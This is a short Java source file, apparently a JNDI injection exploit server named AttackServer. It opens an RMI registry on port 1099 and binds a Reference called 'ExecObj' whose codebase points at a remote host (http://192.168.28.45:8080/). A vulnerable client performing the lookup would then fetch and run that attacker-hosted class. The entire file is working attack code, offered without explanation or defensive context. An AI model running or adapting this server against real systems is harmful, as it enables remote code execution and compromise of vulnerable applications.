package com.jndi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class AttackServer {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference reference = new Reference("ExecObj", "ExecObj",
                "http://192.168.28.45:8080/");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("ExecObj", referenceWrapper);
    }
}
